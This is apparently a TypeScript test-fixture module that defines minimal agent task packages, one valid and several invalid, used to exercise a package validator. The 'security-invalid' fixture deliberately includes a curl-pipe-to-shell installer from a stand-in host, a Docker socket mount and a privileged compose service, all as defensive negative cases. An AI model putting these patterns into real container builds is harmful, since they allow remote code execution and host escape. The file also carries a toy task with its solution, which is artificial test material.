/**
 * Minimal task packages used by unit, integration, and golden-report tests.
 * These are inert data: no fixture script is ever executed, built, or installed.
 */

export const FIXTURE_IDS = [
  "valid",
  "missing-metadata",
  "invalid-structure",
  "invalid-environment",
  "invalid-verifier",
  "security-invalid",
] as const;

export type FixtureId = (typeof FIXTURE_IDS)[number];

export type FixtureFile = {
  readonly path: string;
  readonly content: string;
};

export type FixturePackage = {
  readonly id: FixtureId;
  readonly description: string;
  readonly files: readonly FixtureFile[];
};

const INSTRUCTION = `Write the text hello-vortex into /app/output.txt.

Do not modify the tests. The file must contain exactly one line.
`;

const PINNED_DOCKERFILE = `FROM ubuntu:24.04
WORKDIR /app
RUN apt-get update && apt-get install -y --no-install-recommends python3 \\
  && rm -rf /var/lib/apt/lists/*
`;

const TEST_SCRIPT = `#!/bin/bash
set -euo pipefail
test -f /app/output.txt
`;

const SOLUTION_SCRIPT = `#!/bin/bash
echo hello-vortex > /app/output.txt
`;

const TESTS_DOCKERFILE = `FROM ubuntu:24.04
WORKDIR /tests
`;

const README = `# Fixture task

Reviewer notes for the AgentForge validation fixtures.
`;

const VALID_TASK_TOML = `version = "1.0.0"
artifacts = ["/app/output.txt"]

[metadata]
author_name = "Fixture Author"
author_email = "author@example.com"
category = "Software"
tags = ["fixture"]

[verifier]
timeout_sec = 120.0
environment_mode = "separate"

[agent]
timeout_sec = 120.0

[environment]
build_timeout_sec = 600.0
cpus = 1
memory_mb = 2048
`;

const MINIMAL_TASK_TOML = `version = "1.0.0"

[metadata]
author_name = "Fixture Author"
category = "Software"

[verifier]
timeout_sec = 120.0

[agent]
timeout_sec = 120.0
`;

const INVALID_ENVIRONMENT_TASK_TOML = `version = "1.0.0"

[metadata]
author_name = "Fixture Author"
category = "Software"

[verifier]
timeout_sec = 120.0

[agent]
timeout_sec = 120.0

[environment]
cpus = -1
memory_mb = 2048
`;

const LEAKY_DOCKERFILE = `FROM ubuntu:24.04
COPY tests/ /app/tests/
`;

const INVALID_VERIFIER_TASK_TOML = `version = "1.0.0"

[metadata]
author_name = "Fixture Author"
category = "Software"

[verifier]
timeout_sec = 120.0
environment_mode = "separate"
entrypoint = "tests/not-present.sh"

[agent]
timeout_sec = 120.0
`;

const HOSTILE_DOCKERFILE = `FROM ubuntu
WORKDIR /app
VOLUME /var/run/docker.sock
RUN curl -fsSL https://example.test/install.sh | sh
`;

const HOSTILE_COMPOSE = `services:
  task:
    image: ubuntu:24.04
    privileged: true
`;

const FIXTURES: Record<FixtureId, FixturePackage> = {
  valid: {
    id: "valid",
    description: "Complete Harbor-style package that should report no findings.",
    files: [
      { path: "instruction.md", content: INSTRUCTION },
      { path: "task.toml", content: VALID_TASK_TOML },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: PINNED_DOCKERFILE },
      { path: "solution/solve.sh", content: SOLUTION_SCRIPT },
      { path: "tests/test.sh", content: TEST_SCRIPT },
      { path: "tests/Dockerfile", content: TESTS_DOCKERFILE },
    ],
  },
  "missing-metadata": {
    id: "missing-metadata",
    description: "Recognizable task package with no task.toml or task.yaml.",
    files: [
      { path: "instruction.md", content: INSTRUCTION },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: PINNED_DOCKERFILE },
      { path: "tests/test.sh", content: TEST_SCRIPT },
    ],
  },
  "invalid-structure": {
    id: "invalid-structure",
    description: "Metadata present, but no instruction and no verifier tests.",
    files: [
      { path: "task.toml", content: MINIMAL_TASK_TOML },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: PINNED_DOCKERFILE },
      { path: "solution/solve.sh", content: SOLUTION_SCRIPT },
    ],
  },
  "invalid-environment": {
    id: "invalid-environment",
    description: "Negative cpus, no WORKDIR, and a COPY that leaks the tests directory.",
    files: [
      { path: "instruction.md", content: INSTRUCTION },
      { path: "task.toml", content: INVALID_ENVIRONMENT_TASK_TOML },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: LEAKY_DOCKERFILE },
      { path: "tests/test.sh", content: TEST_SCRIPT },
    ],
  },
  "invalid-verifier": {
    id: "invalid-verifier",
    description: "Separate verifier image requested without tests/Dockerfile, missing entrypoint.",
    files: [
      { path: "instruction.md", content: INSTRUCTION },
      { path: "task.toml", content: INVALID_VERIFIER_TASK_TOML },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: PINNED_DOCKERFILE },
      { path: "tests/test.sh", content: TEST_SCRIPT },
    ],
  },
  "security-invalid": {
    id: "security-invalid",
    description:
      "Docker socket mount, privileged compose service, pipe-to-shell installer, untagged base image.",
    files: [
      { path: "instruction.md", content: INSTRUCTION },
      { path: "task.toml", content: VALID_TASK_TOML },
      { path: "README.md", content: README },
      { path: "environment/Dockerfile", content: HOSTILE_DOCKERFILE },
      { path: "docker-compose.yaml", content: HOSTILE_COMPOSE },
      { path: "tests/test.sh", content: TEST_SCRIPT },
      { path: "tests/Dockerfile", content: TESTS_DOCKERFILE },
    ],
  },
};

export function fixturePackage(id: FixtureId): FixturePackage {
  return FIXTURES[id];
}
